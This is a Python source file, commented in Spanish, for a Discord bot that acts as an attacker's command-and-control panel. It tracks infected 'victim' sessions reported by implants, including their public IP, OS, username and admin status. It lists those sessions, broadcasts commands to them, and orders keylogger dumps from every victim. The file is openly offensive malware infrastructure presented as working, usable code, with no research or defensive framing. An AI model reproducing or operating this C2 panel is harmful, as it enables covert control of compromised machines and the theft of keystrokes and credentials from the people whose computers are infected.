#!/usr/bin/env python3
"""
Bot de Discord para C2 (Command and Control)
Panel de control del atacante
"""

import os
import discord
from discord.ext import commands
from datetime import datetime
from dotenv import load_dotenv


# ============================================================
# Configuración (integrado de config.py)
# ============================================================

load_dotenv(os.path.join(os.path.dirname(__file__), '.env'))


class DiscordConfig:
    """Configuración de Discord con validación"""
    
    def __init__(self):
        self.bot_token = os.getenv('DISCORD_BOT_TOKEN', '')
        self.command_channel_id = int(os.getenv('COMMAND_CHANNEL_ID', '0'))
    
    def validate(self):
        """Valida la configuración"""
        if not self.bot_token:
            raise ValueError("DISCORD_BOT_TOKEN no definida en .env")
        if len(self.bot_token) < 10:
            raise ValueError("Token de Discord inválido")
        if self.command_channel_id <= 0:
            raise ValueError("COMMAND_CHANNEL_ID inválido")
        return True


# Configuración global
config = DiscordConfig()
config.validate()

BOT_TOKEN = config.bot_token
COMMAND_CHANNEL_ID = config.command_channel_id


# ============================================================
# Bot
# ============================================================

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Sesiones activas
active_sessions = {}

# Notificaciones activadas
notify_enabled = True


# ============================================================
# Logging (integrado de commands.py)
# ============================================================

def log_action(action, session_id="", details=""):
    """Registra acciones del atacante en consola"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    session = f" [{session_id}]" if session_id else ""
    print(f"[{timestamp}] ATACANTE:{action}{session} {details}")


# ============================================================
# Eventos
# ============================================================

@bot.event
async def on_ready():
    """Evento cuando el bot está listo"""
    print(f'[+] Bot conectado como: {bot.user}')
    print(f'[+] Canal de comandos: {COMMAND_CHANNEL_ID}')
    log_action("BOT_INICIADO")
    
    channel = bot.get_channel(COMMAND_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title="C2 Server Iniciado",
            description="Esperando conexiones de víctimas...",
            color=0x00ff00,
            timestamp=datetime.now()
        )
        await channel.send(embed=embed)


@bot.event
async def on_message(message):
    """Procesa mensajes recibidos"""
    if message.author == bot.user:
        return
    
    if message.channel.id != COMMAND_CHANNEL_ID:
        return
    
    # Detectar nueva sesión (por embed)
    if message.embeds:
        embed = message.embeds[0]
        if embed.title and "Nueva sesión iniciada" in embed.title:
            session_id = embed.description.replace("ID:", "").strip()
            active_sessions[session_id] = {
                'channel': message.channel,
                'start_time': datetime.now(),
                'last_seen': datetime.now(),
                'ip': None,
                'os': None,
                'user': None,
                'admin': None
            }
            
            # Extraer info del embed
            for field in embed.fields:
                if field.name == "IP Pública":
                    active_sessions[session_id]['ip'] = field.value
                elif field.name == "Sistema":
                    active_sessions[session_id]['os'] = field.value
                elif field.name == "Usuario":
                    active_sessions[session_id]['user'] = field.value
                elif field.name == "Admin":
                    active_sessions[session_id]['admin'] = field.value
            
            log_action("NUEVA_SESION", session_id)
            
            # Notificación automática
            if notify_enabled:
                channel = bot.get_channel(COMMAND_CHANNEL_ID)
                await channel.send(
                    f"🔔 **Nueva víctima conectada:** `{session_id}`"
                )
    
    await bot.process_commands(message)


@bot.event
async def on_command_error(ctx, error):
    """Manejo de errores de comandos"""
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(
            f"❌ Comando no encontrado. Usa `!help_c2` para ver comandos disponibles."
        )
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Faltan argumentos. Uso: `{ctx.prefix}{ctx.command.name} {ctx.command.signature}`")
    else:
        await ctx.send(f"❌ Error: {str(error)}")


# ============================================================
# Comandos del panel de control
# ============================================================

@bot.command()
async def sessions(ctx):
    """Lista sesiones activas"""
    if not active_sessions:
        await ctx.send("🔴 No hay sesiones activas")
        return
    
    embed = discord.Embed(
        title="Sesiones Activas",
        color=0x3498db,
        timestamp=datetime.now()
    )
    
    for sid, data in active_sessions.items():
        duration = datetime.now() - data['start_time']
        hours, remainder = divmod(int(duration.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        time_str = f"{hours}h {minutes}m {seconds}s"
        
        embed.add_field(
            name=f"Session {sid}",
            value=f"⏱️ {time_str}",
            inline=False
        )
    
    await ctx.send(embed=embed)
    log_action("LISTAR_SESIONES", details=f"{len(active_sessions)} activas")


@bot.command()
async def broadcast(ctx, *, msg):
    """Envía mensaje a todas las sesiones"""
    if not active_sessions:
        await ctx.send("🔴 No hay sesiones activas")
        return
    
    embed = discord.Embed(
        title="📢 Broadcast del Atacante",
        description=msg,
        color=0xff9900,
        timestamp=datetime.now()
    )
    
    await ctx.send(embed=embed)
    await ctx.send(
        f"✅ Broadcast enviado a {len(active_sessions)} sesiones"
    )
    log_action("BROADCAST", details=msg)


@bot.command()
async def cleanup(ctx):
    """Limpia sesiones inactivas (más de 1 hora)"""
    if not active_sessions:
        await ctx.send("🔴 No hay sesiones activas")
        return
    
    to_remove = []
    for sid, data in active_sessions.items():
        duration = datetime.now() - data['start_time']
        if duration.total_seconds() > 3600:  # 1 hora
            to_remove.append(sid)
    
    for sid in to_remove:
        del active_sessions[sid]
    
    await ctx.send(
        f"🧹 Limpiadas {len(to_remove)} sesiones inactivas. "
        f"Restantes: {len(active_sessions)}"
    )
    log_action("LIMPIAR_SESIONES", details=f"Eliminadas: {len(to_remove)}")


@bot.command()
async def victim(ctx, session_id: str = None):
    """Muestra información detallada de una víctima"""
    if not session_id:
        await ctx.send("❌ Uso: `!victim <session_id>`")
        return

    if session_id not in active_sessions:
        await ctx.send(f"❌ Sesión `{session_id}` no encontrada")
        return

    data = active_sessions[session_id]
    duration = datetime.now() - data['start_time']
    hours, remainder = divmod(int(duration.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)

    embed = discord.Embed(
        title=f"Víctima: {session_id}",
        color=0xe74c3c,
        timestamp=datetime.now()
    )
    embed.add_field(name="🌐 IP Pública", value=data.get('ip') or 'N/A', inline=True)
    embed.add_field(name="💻 Sistema", value=data.get('os') or 'N/A', inline=True)
    embed.add_field(name="👤 Usuario", value=data.get('user') or 'N/A', inline=True)
    embed.add_field(name="🔑 Admin", value=data.get('admin') or 'N/A', inline=True)
    embed.add_field(name="⏱️ Duración", value=f"{hours}h {minutes}m {seconds}s", inline=True)
    embed.add_field(name="📅 Conectado", value=data['start_time'].strftime("%Y-%m-%d %H:%M:%S"), inline=True)

    await ctx.send(embed=embed)
    log_action("INFO_VICTIMA", session_id)


@bot.command()
async def notify(ctx, state: str = None):
    """Activa/desactiva notificaciones de nuevas víctimas"""
    global notify_enabled
    if state is None:
        actual = "✅ Activadas" if notify_enabled else "❌ Desactivadas"
        await ctx.send(f"🔔 Notificaciones: {actual}\nUso: `!notify on` / `!notify off`")
        return

    if state.lower() == 'on':
        notify_enabled = True
        await ctx.send("✅ Notificaciones **activadas**")
    elif state.lower() == 'off':
        notify_enabled = False
        await ctx.send("❌ Notificaciones **desactivadas**")
    else:
        await ctx.send("❌ Uso: `!notify on` / `!notify off`")

    log_action("NOTIFY", details=f"Estado: {state}")


@bot.command()
async def keylog_dump(ctx):
    """Solicita el volcado del keylogger a todas las víctimas"""
    if not active_sessions:
        await ctx.send("🔴 No hay sesiones activas")
        return

    embed = discord.Embed(
        title="🔑 Keylog Dump",
        description="Volcando buffer del keylogger...",
        color=0xe67e22,
        timestamp=datetime.now()
    )
    
    await ctx.send(embed=embed)
    await ctx.send(
        f"✅ Solicitud enviada a {len(active_sessions)} sesiones.\n"
        f"Los resultados aparecerán como respuestas en el canal."
    )
    log_action("KEYLOG_DUMP", details=f"A {len(active_sessions)} sesiones")


@bot.command()
async def info(ctx):
    """Muestra información del bot"""
    embed = discord.Embed(
        title="Panel de Control C2",
        color=0x3498db,
        timestamp=datetime.now()
    )
    embed.add_field(name="Bot", value=str(bot.user), inline=True)
    embed.add_field(name="Sesiones activas", value=str(len(active_sessions)), inline=True)
    embed.add_field(name="Canal", value=f"<#{COMMAND_CHANNEL_ID}>", inline=True)
    embed.add_field(name="Latencia", value=f"{round(bot.latency * 1000)}ms", inline=True)
    embed.add_field(name="Servidores", value=str(len(bot.guilds)), inline=True)
    
    await ctx.send(embed=embed)
    log_action("INFO_SOLICITADA")


@bot.command()
async def help_c2(ctx):
    """Muestra ayuda del panel"""
    help_text = """
**Panel de Control C2 — Comandos:**

📋 `!sessions` — Ver sesiones activas
📡 `!broadcast <msg>` — Enviar mensaje a todas las víctimas
🧹 `!cleanup` — Limpiar sesiones inactivas (>1h)
📊 `!info` — Información del bot
🔍 `!victim <id>` — Detalle de una víctima específica
🔔 `!notify on/off` — Activar/desactivar notificaciones
🔑 `!keylog_dump` — Solicitar volcado del keylogger
❓ `!help_c2` — Esta ayuda
    """
    await ctx.send(help_text)


# ============================================================
# Iniciar bot
# ============================================================

if __name__ == '__main__':
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"[-] Error: {e}")
        exit(1)
